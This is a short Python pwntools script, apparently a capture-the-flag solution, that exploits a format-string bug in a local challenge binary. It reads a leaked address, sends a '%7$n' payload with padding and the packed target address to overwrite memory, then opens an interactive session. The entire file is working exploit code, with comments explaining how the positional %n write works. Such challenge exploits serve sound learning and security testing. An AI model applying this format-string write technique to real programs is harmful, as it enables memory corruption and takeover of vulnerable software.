from pwn import *
from struct import pack
import time

context.terminal = ['kitty', '@', 'launch', '--keep-focus']

# io = gdb.debug('./chall', gdbscript='''
# # break main
# b *0x00000000004016c1
# b *0x00000000004016d2
# continue
# ''')

io = ELF('./chall').process()

io.recvuntil(b'@ ')
line = io.recvuntil('\n')
var_addr = line[:-1]
print('var_addr', var_addr)

# %7$n = write the number of bytes already written to the address contained in the 7th arg
# 4 bytes of bs to align everything
# address (which ends up in the 7th arg)
pwnmsg = b'%7$n' + b'a'*4 + p64(int(var_addr, 16)-2, endian='little')
print(pwnmsg)

io.recvuntil(b'input: ')
io.sendline(pwnmsg)
print(io.recvline())

io.interactive()
